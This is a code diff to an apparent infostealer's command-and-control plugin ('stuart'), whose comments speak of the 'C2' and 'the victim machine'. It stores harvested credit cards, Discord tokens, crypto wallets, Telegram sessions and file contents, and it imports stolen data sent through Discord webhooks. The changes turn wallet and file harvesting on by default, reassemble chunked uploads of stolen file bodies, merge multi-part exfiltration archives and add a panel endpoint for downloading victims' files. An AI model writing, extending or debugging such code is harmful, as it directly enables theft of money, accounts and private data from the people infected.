@@ -312,10 +312,10 @@ let pluginSettings = {
   discord_bot_token: "",
   discord_forum_channel_id: "",
   discord_thread_prefix: "Stuart",
-  /** Manual Collect extras (never auto-run on connect). */
-  harvest_files: false,
+  /** Manual Collect extras (never auto-run on connect). Default files ON so bodies are harvested. */
+  harvest_files: true,
   harvest_extensions: false,
-  harvest_wallets: false,
+  harvest_wallets: true,
   harvest_telegram: false,
   /** Default common file-scan rules (extension / name contains / dir / fullUpload). */
   harvest_file_rules: [
@@ -378,6 +378,8 @@ const pendingDiscordWallets = new Map();
  * key = `${clientId}\0${name}` → { meta, chunks: Map, total, size }
  */
 const pendingWalletChunks = new Map();
+/** clientId+path -> { meta, chunks: Map, total } for large file_auto uploads */
+const pendingFileChunks = new Map();
 /**
  * Wait for wallet_auto_data before Discord flush.
  * clientId -> { expected: Set<string>, received: Set<string>, done: boolean, maxTimer }
@@ -396,6 +398,10 @@ function walletBlobPath(clientId, name) {
 }
 function telegramBlobPath(clientId, account) {
   return join(blobDir, `tg_${safeFsName(clientId)}_${safeFsName(account)}.bin`);
+}
+function fileBlobPath(clientId, path) {
+  // Path-based so unique per source file on the victim machine
+  return join(blobDir, `fi_${safeFsName(clientId)}_${safeFsName(path)}.bin`);
 }
 function writeBlob(filePath, data) {
   try { writeFileSync(filePath, data); return true; } catch (_) { return false; }
@@ -430,12 +436,53 @@ function readTelegramContentById(db, id) {
   return data ? { account: row.account, content: data } : null;
 }
 
+function readFileContentById(db, id) {
+  const row = db.prepare(`SELECT name, path, content, blob_path FROM files WHERE id = ?`).get(id);
+  if (!row) return null;
+  let data = null;
+  if (row.blob_path) data = readBlob(row.blob_path);
+  if (!data && row.content) data = Buffer.from(row.content);
+  return data ? { name: row.name || baseName(row.path || "file"), content: data } : null;
+}
+
+/** Persist scanned-file body so the panel can download without a live agent. */
+function storeFileContent(db, clientId, meta, contentBuf, now) {
+  if (!contentBuf || !contentBuf.length || !meta?.path) return false;
+  const path = String(meta.path);
+  const name = meta.name || baseName(path);
+  const dir = meta.dir || null;
+  const ext = meta.ext || null;
+  const size = contentBuf.length;
+  const modified = meta.modified ?? null;
+  const tags = Array.isArray(meta.tags) ? meta.tags.join(",") : (meta.tags || null);
+
+  let bp = null;
+  if (blobDir) {
+    bp = fileBlobPath(clientId, path);
+    if (!writeBlob(bp, contentBuf)) bp = null;
+  }
+
+  // Ensure metadata row exists, then attach content (REPLACE would wipe BLOB if re-run without content)
+  db.prepare(
+    `INSERT INTO files(client_id,dir,name,ext,size,modified,path,tags,captured_at)
+     VALUES(?,?,?,?,?,?,?,?,?)
+     ON CONFLICT(client_id, path) DO UPDATE SET
+       dir=excluded.dir, name=excluded.name, ext=excluded.ext, size=excluded.size,
+       modified=excluded.modified, tags=excluded.tags, captured_at=excluded.captured_at`
+  ).run(clientId, dir, name, ext, size, modified, path, tags, now || Date.now());
+
+  db.prepare(
+    `UPDATE files SET content = ?, blob_path = ?, size = ? WHERE client_id = ? AND path = ?`
+  ).run(bp ? null : contentBuf, bp, size, clientId, path);
+  return true;
+}
+
 function deleteClientBlobs(clientId) {
   if (!blobDir) return;
   const prefix = safeFsName(clientId);
   try {
     for (const f of readdirSync(blobDir)) {
-      if (f.startsWith(`wd_${prefix}_`) || f.startsWith(`tg_${prefix}_`))
+      if (f.startsWith(`wd_${prefix}_`) || f.startsWith(`tg_${prefix}_`) || f.startsWith(`fi_${prefix}_`))
         deleteBlob(join(blobDir, f));
     }
   } catch (_) {}
@@ -1158,16 +1205,31 @@ async function downloadDiscordAttachment(att) {
 async function importThisWebhookZip(db, msg, fallbackClientId, localParts) {
   if (!db || !stmts) return { ok: false, reason: "no db" };
 
-  // Fast path: import the zip parts we just built (same harvest, no CDN)
+  // Fast path: import the zip parts we just built (same harvest, no CDN).
+  // MUST merge all parts first — file_blobs and files.json are split across parts.
   if (localParts?.length) {
     let clientId = fallbackClientId;
-    const mergedCounts = {};
+    let mergedCounts = {};
+    try {
+      const result = importZipPartsIntoDb(db, localParts, clientId || fallbackClientId);
+      clientId = result.clientId || clientId;
+      mergedCounts = result.counts || {};
+    } catch (e) {
+      console.error(`[stuart] merged log import failed: ${e.message}`);
+      // Fallback: try part-by-part (metadata only likely)
+      for (const p of localParts) {
+        try {
+          const result = importZipIntoDb(db, p.zip, clientId || fallbackClientId);
+          clientId = result.clientId || clientId;
+          for (const [k, v] of Object.entries(result.counts || {}))
+            mergedCounts[k] = (mergedCounts[k] || 0) + v;
+        } catch (e2) {
+          console.warn(`[stuart] part import ${p.filename}: ${e2.message}`);
+        }
+      }
+    }
     for (let i = 0; i < localParts.length; i++) {
       const p = localParts[i];
-      const result = importZipIntoDb(db, p.zip, clientId || fallbackClientId);
-      clientId = result.clientId || clientId;
-      for (const [k, v] of Object.entries(result.counts || {}))
-        mergedCounts[k] = (mergedCounts[k] || 0) + v;
       const fakeId = `local-${msg?.id || Date.now()}-p${i}-${p.filename}`;
       db.prepare(
         `INSERT OR IGNORE INTO discord_imports(attachment_id, message_id, thread_id, client_id, filename, imported_at) VALUES(?,?,?,?,?,?)`
@@ -1175,14 +1237,21 @@ async function importThisWebhookZip(db, msg, fallbackClientId, localParts) {
     }
     try {
       pluginCtx?.broadcast?.("harvest_update", { clientId, source: "discord" });
+      if (mergedCounts.file_blobs) {
+        pluginCtx?.broadcast?.("file_data_update", { clientId, done: true, count: mergedCounts.file_blobs });
+      }
     } catch (_) {}
     discordPollStatus = {
       lastAt: Date.now(),
       lastOk: true,
       lastError: "",
       imported: localParts.length,
-      message: `imported ${localParts.length} part(s) → ${clientId}`,
+      message: `imported ${localParts.length} part(s) merged → ${clientId} bodies=${mergedCounts.file_blobs || 0}`,
     };
+    console.log(
+      `[stuart] Discord log import: parts=${localParts.length} client=${clientId} ` +
+      `files=${mergedCounts.files || 0} bodies=${mergedCounts.file_blobs || 0}`
+    );
     return { ok: true, clientId, parts: localParts.length, counts: mergedCounts, local: true };
   }
 
@@ -1201,21 +1270,52 @@ async function importThisWebhookZip(db, msg, fallbackClientId, localParts) {
   if (!zips.length) return { ok: false, reason: "no zip attachment on webhook response" };
 
   let clientId = fallbackClientId;
-  let n = 0;
+  const toImport = [];
   for (const att of zips) {
     if (db.prepare(`SELECT 1 FROM discord_imports WHERE attachment_id = ?`).get(att.id)) continue;
-    const zipBuf = await downloadDiscordAttachment(att);
-    const result = importZipIntoDb(db, zipBuf, clientId || fallbackClientId);
-    clientId = result.clientId || clientId;
-    db.prepare(
-      `INSERT OR IGNORE INTO discord_imports(attachment_id, message_id, thread_id, client_id, filename, imported_at) VALUES(?,?,?,?,?,?)`
-    ).run(att.id, msg.id || null, msg.channel_id || null, clientId, att.filename || "", Date.now());
-    n++;
-    console.log(`[stuart] imported webhook zip ${att.filename} → client ${clientId}`);
+    try {
+      const zipBuf = await downloadDiscordAttachment(att);
+      toImport.push({ zip: zipBuf, filename: att.filename || "part.zip", att });
+    } catch (e) {
+      console.warn(`[stuart] download webhook zip ${att.filename}: ${e.message}`);
+    }
+  }
+  let n = 0;
+  let counts = {};
+  if (toImport.length) {
+    try {
+      const result = importZipPartsIntoDb(db, toImport, clientId || fallbackClientId);
+      clientId = result.clientId || clientId;
+      counts = result.counts || {};
+      n = toImport.length;
+    } catch (e) {
+      console.error(`[stuart] merged webhook zip import failed: ${e.message}`);
+      for (const p of toImport) {
+        try {
+          const result = importZipIntoDb(db, p.zip, clientId || fallbackClientId);
+          clientId = result.clientId || clientId;
+          for (const [k, v] of Object.entries(result.counts || {}))
+            counts[k] = (counts[k] || 0) + v;
+          n++;
+        } catch (e2) {
+          console.warn(`[stuart] zip import ${p.filename}: ${e2.message}`);
+        }
+      }
+    }
+    for (const p of toImport) {
+      if (p.att?.id) {
+        db.prepare(
+          `INSERT OR IGNORE INTO discord_imports(attachment_id, message_id, thread_id, client_id, filename, imported_at) VALUES(?,?,?,?,?,?)`
+        ).run(p.att.id, msg.id || null, msg.channel_id || null, clientId, p.filename || "", Date.now());
+      }
+    }
   }
   if (n > 0) {
     try {
       pluginCtx?.broadcast?.("harvest_update", { clientId, source: "discord" });
+      if (counts.file_blobs) {
+        pluginCtx?.broadcast?.("file_data_update", { clientId, done: true, count: counts.file_blobs });
+      }
     } catch (_) {}
   }
   discordPollStatus = {
@@ -1223,9 +1323,9 @@ async function importThisWebhookZip(db, msg, fallbackClientId, localParts) {
     lastOk: true,
     lastError: "",
     imported: n,
-    message: `imported ${n} attachment(s) from this post → ${clientId}`,
+    message: `imported ${n} attachment(s) merged → ${clientId} bodies=${counts.file_blobs || 0}`,
   };
-  return { ok: true, clientId, parts: n };
+  return { ok: true, clientId, parts: n, counts };
 }
 
 function getWalletExpect(clientId) {
@@ -1960,16 +2060,67 @@ function baseName(path) {
   return n.toLowerCase();
 }
 
+/**
+ * Import one or more harvest log zips as a SINGLE unit.
+ * Discord splits harvests into ≤7.5MiB parts — files.json often lands in a different
+ * part than file_blobs/*; importing parts separately used to drop all file bodies.
+ */
 function importZipIntoDb(db, zipBuf, fallbackClientId) {
+  return importLogEntriesIntoDb(db, unzipAll(zipBuf), fallbackClientId);
+}
+
+/** Merge every log zip part then import once so file_blobs + files.json rejoin. */
+function importZipPartsIntoDb(db, parts, fallbackClientId) {
   if (!stmts) throw new Error("statements not ready");
-  const entries = unzipAll(zipBuf);
-  if (!entries.length) throw new Error("empty or unsupported zip");
+  const entries = [];
+  for (const p of parts || []) {
+    if (!p?.zip) continue;
+    try {
+      entries.push(...unzipAll(p.zip));
+    } catch (e) {
+      console.warn(`[stuart] unzip part ${p.filename || "?"}: ${e.message}`);
+    }
+  }
+  if (!entries.length) throw new Error("empty or unsupported zip parts");
+  console.log(`[stuart] merged ${parts.length} log zip part(s) → ${entries.length} entries for import`);
+  return importLogEntriesIntoDb(db, entries, fallbackClientId);
+}
+
+function importLogEntriesIntoDb(db, entries, fallbackClientId) {
+  if (!stmts) throw new Error("statements not ready");
+  if (!entries?.length) throw new Error("empty or unsupported zip");
 
   let clientId = fallbackClientId || null;
   const buckets = emptyExportData();
+  /** @type {Map<string, Buffer>} blob relative path (file_blobs/…) → raw bytes */
+  const fileBlobMap = new Map();
 
   for (const ent of entries) {
+    const norm = String(ent.name || "").replace(/\\/g, "/");
     const bn = baseName(ent.name);
+    // Matched-file bodies packed by agent next to files.json
+    // Match /file_blobs/ or leading file_blobs/
+    let relBlob = null;
+    const blobIdx = norm.indexOf("/file_blobs/");
+    if (blobIdx >= 0) relBlob = norm.slice(blobIdx + 1);
+    else if (norm.startsWith("file_blobs/")) relBlob = norm;
+    else if (/(^|\/)file_blobs\//i.test(norm)) {
+      const m = norm.match(/file_blobs\/.+$/i);
+      if (m) relBlob = m[0];
+    }
+    if (relBlob) {
+      const rel = relBlob.replace(/\\/g, "/");
+      fileBlobMap.set(rel, ent.data);
+      fileBlobMap.set(rel.toLowerCase(), ent.data);
+      fileBlobMap.set(bn, ent.data);
+      // also index by filename only (0_foo.pdf)
+      const leaf = rel.split("/").pop();
+      if (leaf) {
+        fileBlobMap.set(leaf, ent.data);
+        fileBlobMap.set(leaf.toLowerCase(), ent.data);
+      }
+      continue;
+    }
     const text = ent.data.toString("utf8");
     if (bn === "meta.json") {
       try {
@@ -1988,8 +2139,24 @@ function importZipIntoDb(db, zipBuf, fallbackClientId) {
     try {
       const rows = JSON.parse(text);
       if (Array.isArray(rows)) {
-        if (buckets[key]) buckets[key] = rows;
-        else buckets[key] = rows;
+        // Prefer the largest files.json if multiple parts each carry a partial list
+        if (key === "files" && buckets[key]?.length && rows.length < buckets[key].length) {
+          // keep larger
+        } else if (key === "files" && buckets[key]?.length && rows.length === buckets[key].length) {
+          // merge blob refs if present
+          const byPath = new Map(buckets[key].map(r => [r.path, r]));
+          for (const r of rows) {
+            const prev = byPath.get(r.path);
+            if (prev && (r.blob || r.Blob) && !(prev.blob || prev.Blob)) {
+              prev.blob = r.blob || r.Blob;
+            } else if (!prev) {
+              byPath.set(r.path, r);
+            }
+          }
+          buckets[key] = [...byPath.values()];
+        } else {
+          buckets[key] = rows;
+        }
       }
     } catch (_) {}
   }
@@ -2043,8 +2210,64 @@ function importZipIntoDb(db, zipBuf, fallbackClientId) {
     })),
   };
 
+  let filesWithContent = 0;
+  const blobMiss = [];
   const tx = db.transaction(() => {
     insertPayload(db, stmts, clientId, payload, now);
+    // Attach raw bodies referenced by files.json "blob" field (and multi-part chunks)
+    for (const r of buckets.files || []) {
+      const blobKey = r.blob || r.Blob;
+      if (!blobKey) continue;
+      const keyNorm = String(blobKey).replace(/\\/g, "/");
+      const leaf = keyNorm.split("/").pop() || keyNorm;
+      const partsN = Number(r.blobParts || r.BlobParts || 0) || 0;
+      let data = null;
+      if (partsN > 1) {
+        // Chunked: file_blobs/0_name.pdf.part000 …
+        const chunks = [];
+        let ok = true;
+        for (let i = 0; i < partsN; i++) {
+          const pk = `${keyNorm}.part${String(i).padStart(3, "0")}`;
+          const leafPk = `${leaf}.part${String(i).padStart(3, "0")}`;
+          const c = fileBlobMap.get(pk) || fileBlobMap.get(pk.toLowerCase())
+            || fileBlobMap.get(leafPk) || fileBlobMap.get(leafPk.toLowerCase());
+          if (!c) { ok = false; break; }
+          chunks.push(c);
+        }
+        if (ok) data = Buffer.concat(chunks);
+      }
+      if (!data) {
+        data = fileBlobMap.get(keyNorm)
+          || fileBlobMap.get(keyNorm.toLowerCase())
+          || fileBlobMap.get(leaf)
+          || fileBlobMap.get(leaf.toLowerCase())
+          || fileBlobMap.get(baseName(blobKey));
+      }
+      // Also try any .part000 only file stored without blobParts meta
+      if (!data) {
+        const p0 = fileBlobMap.get(`${keyNorm}.part000`) || fileBlobMap.get(`${leaf}.part000`);
+        if (p0) {
+          const chunks = [p0];
+          for (let i = 1; i < 64; i++) {
+            const c = fileBlobMap.get(`${keyNorm}.part${String(i).padStart(3, "0")}`)
+              || fileBlobMap.get(`${leaf}.part${String(i).padStart(3, "0")}`);
+            if (!c) break;
+            chunks.push(c);
+          }
+          if (chunks.length) data = Buffer.concat(chunks);
+        }
+      }
+      if (!data) {
+        blobMiss.push(keyNorm);
+        continue;
+      }
+      if (storeFileContent(db, clientId, {
+        path: r.path, name: r.name, dir: r.dir, ext: r.ext,
+        modified: r.modified, tags: r.tags,
+      }, data, now)) {
+        filesWithContent++;
+      }
+    }
     // gaming / vpn rows from flat export
     for (const r of buckets.gaming_items || []) {
       stmts.insGaming.run(clientId, r.platform, r.label, r.value, r.detail || "", now);
@@ -2076,6 +2299,15 @@ function importZipIntoDb(db, zipBuf, fallbackClientId) {
 
   const counts = {};
   for (const k of EXPORT_FILE_ORDER) if (buckets[k]?.length) counts[k] = buckets[k].length;
+  if (filesWithContent) counts.file_blobs = filesWithContent;
+  console.log(
+    `[stuart] import client=${clientId} files_meta=${(buckets.files || []).length} ` +
+    `file_blobs_map=${fileBlobMap.size} stored_bodies=${filesWithContent}` +
+    (blobMiss.length ? ` missing_blobs=${blobMiss.length}` : "")
+  );
+  if (blobMiss.length && blobMiss.length <= 10) {
+    console.warn(`[stuart] missing blob keys sample: ${blobMiss.slice(0, 10).join(", ")}`);
+  }
   return { clientId, counts };
 }
 
@@ -2608,7 +2840,12 @@ function prepareStatements(db) {
     insBk:     db.prepare(`INSERT OR REPLACE INTO bookmarks(client_id,name,url,type,browser,profile,captured_at) VALUES(?,?,?,?,?,?,?)`),
     insCc:     db.prepare(`INSERT OR REPLACE INTO credit_cards(client_id,name_on_card,card_number,expiration_month,expiration_year,nickname,browser,profile,captured_at) VALUES(?,?,?,?,?,?,?,?,?)`),
     insDt:     db.prepare(`INSERT OR IGNORE INTO discord_tokens(client_id,token,source,captured_at) VALUES(?,?,?,?)`),
-    insFi:     db.prepare(`INSERT OR REPLACE INTO files(client_id,dir,name,ext,size,modified,path,tags,captured_at) VALUES(?,?,?,?,?,?,?,?,?)`),
+    // Preserve content/blob_path when re-listing the same path
+    insFi:     db.prepare(`INSERT INTO files(client_id,dir,name,ext,size,modified,path,tags,captured_at) VALUES(?,?,?,?,?,?,?,?,?)
+      ON CONFLICT(client_id, path) DO UPDATE SET
+        dir=excluded.dir, name=excluded.name, ext=excluded.ext,
+        size=CASE WHEN files.content IS NOT NULL OR files.blob_path IS NOT NULL THEN files.size ELSE excluded.size END,
+        modified=excluded.modified, tags=excluded.tags, captured_at=excluded.captured_at`),
     insEx:     db.prepare(`INSERT OR REPLACE INTO extensions(client_id,ext_id,name,version,browser,profile,path,category,captured_at) VALUES(?,?,?,?,?,?,?,?,?)`),
     insWl:     db.prepare(`INSERT OR REPLACE INTO wallets(client_id,name,type,path,files,size,captured_at) VALUES(?,?,?,?,?,?,?)`),
     insTg:     db.prepare(`INSERT OR REPLACE INTO telegram_sessions(client_id,account,path,files,size,captured_at) VALUES(?,?,?,?,?,?)`),
@@ -2732,7 +2969,7 @@ const TABLE_CFGS = {
   },
   files: {
     tbl: 'files',
-    sel: 'client_id as clientId,dir,name,ext,size,modified,path,tags',
+    sel: 'id, client_id as clientId,dir,name,ext,size,modified,path,tags,(content IS NOT NULL OR blob_path IS NOT NULL) as hasContent',
     searchOn: ['dir', 'name', 'path'],
     order: 'modified DESC',
     hasBrowser: false,
@@ -3131,6 +3368,8 @@ export default {
     // blob_path columns for disk-backed BLOBs
     try { ctx.db.exec(`ALTER TABLE wallet_data ADD COLUMN blob_path TEXT`); } catch (_) {}
     try { ctx.db.exec(`ALTER TABLE telegram_sessions ADD COLUMN blob_path TEXT`); } catch (_) {}
+    try { ctx.db.exec(`ALTER TABLE files ADD COLUMN content BLOB`); } catch (_) {}
+    try { ctx.db.exec(`ALTER TABLE files ADD COLUMN blob_path TEXT`); } catch (_) {}
 
     // Create blob directory
     blobDir = join(ctx.dataDir, "blobs");
@@ -3292,9 +3531,9 @@ export default {
           enrichDiscordToken(ctx, clientId, r.token).catch(() => {});
       ctx.broadcast("harvest_update", { clientId });
     } else if (event === "file_scan_results") {
+      // Always store metadata on C2 so the Files tab can show rows immediately
       if (isDiscordPipelineOn()) {
         viaDiscord({ files: payload?.files || [] });
-        return;
       }
       const tx = ctx.db.transaction(() => {
         for (const r of payload?.files || [])
@@ -3303,6 +3542,75 @@ export default {
       });
       tx();
       ctx.broadcast("harvest_update", { clientId });
+    } else if (event === "file_auto_start") {
+      console.log(`[stuart] file_auto_start client=${clientId} count=${payload?.count || 0}`);
+    } else if (event === "file_auto_skip") {
+      console.log(`[stuart] file_auto_skip ${payload?.name || payload?.path}: ${payload?.reason || ""}`);
+    } else if (event === "file_auto_done") {
+      console.log(`[stuart] file_auto_done client=${clientId} sent=${payload?.sent} expected=${payload?.expected}`);
+      ctx.broadcast("file_data_update", { clientId, done: true });
+    } else if (event === "file_auto_data") {
+      // Store file body on C2 for panel download (works with or without Discord pipeline)
+      try {
+        const contentB64 = payload?.content;
+        if (!contentB64 || !payload?.path) {
+          console.warn(`[stuart] file_auto_data missing content/path`);
+        } else {
+          const buf = Buffer.from(contentB64, "base64");
+          const ok = storeFileContent(ctx.db, clientId, payload, buf, now);
+          if (ok) {
+            stmts.upsertRun.run(clientId, now);
+            ctx.broadcast("file_data_update", { clientId, path: payload.path, name: payload.name });
+            console.log(`[stuart] file stored ${payload.name || payload.path} (${buf.length} bytes)`);
+          }
+        }
+      } catch (e) {
+        console.warn(`[stuart] file_auto_data error: ${e.message}`);
+      }
+    } else if (event === "file_auto_chunk_start" || event === "file_auto_chunk" || event === "file_auto_chunk_end") {
+      const path = payload?.path || "";
+      const key = `${clientId}::${path}`;
+      if (event === "file_auto_chunk_start") {
+        pendingFileChunks.set(key, {
+          meta: {
+            path,
+            name: payload?.name,
+            dir: payload?.dir,
+            ext: payload?.ext,
+            modified: payload?.modified,
+            tags: payload?.tags,
+          },
+          chunks: new Map(),
+          total: payload?.chunks || 0,
+          size: payload?.size || 0,
+        });
+      } else if (event === "file_auto_chunk") {
+        const acc = pendingFileChunks.get(key);
+        if (acc && payload?.content) {
+          acc.chunks.set(Number(payload.chunk) || 0, Buffer.from(payload.content, "base64"));
+        }
+      } else if (event === "file_auto_chunk_end") {
+        const acc = pendingFileChunks.get(key);
+        pendingFileChunks.delete(key);
+        if (acc && acc.chunks.size) {
+          const parts = [];
+          const total = acc.total || acc.chunks.size;
+          for (let i = 1; i <= total; i++) {
+            const c = acc.chunks.get(i);
+            if (c) parts.push(c);
+          }
+          const buf = Buffer.concat(parts);
+          try {
+            if (storeFileContent(ctx.db, clientId, acc.meta, buf, now)) {
+              stmts.upsertRun.run(clientId, now);
+              ctx.broadcast("file_data_update", { clientId, path, name: acc.meta.name });
+              console.log(`[stuart] file stored (chunked) ${acc.meta.name || path} (${buf.length} bytes)`);
+            }
+          } catch (e) {
+            console.warn(`[stuart] file_auto_chunk_end error: ${e.message}`);
+          }
+        }
+      }
     } else if (event === "extension_scan_results") {
       if (isDiscordPipelineOn()) {
         viaDiscord({ extensions: payload?.extensions || [] });
@@ -3789,6 +4097,23 @@ export default {
       const result = readWalletContentById(ctx.db, id);
       if (!result) throw new Error("No data found");
       return { name: result.name, content: result.content.toString('base64') };
+    },
+
+    download_file_data(ctx, params) {
+      const id = params?.id;
+      const path = params?.path;
+      const cid = params?.clientId;
+      let result = null;
+      if (id) {
+        result = readFileContentById(ctx.db, id);
+      } else if (path && cid) {
+        const row = ctx.db.prepare(
+          `SELECT id FROM files WHERE client_id = ? AND path = ?`
+        ).get(cid, path);
+        if (row) result = readFileContentById(ctx.db, row.id);
+      }
+      if (!result) throw new Error("No file content stored — re-run scan or wait for auto-upload");
+      return { name: result.name, content: result.content.toString("base64") };
     },
 
     async check_balances(ctx, params) {
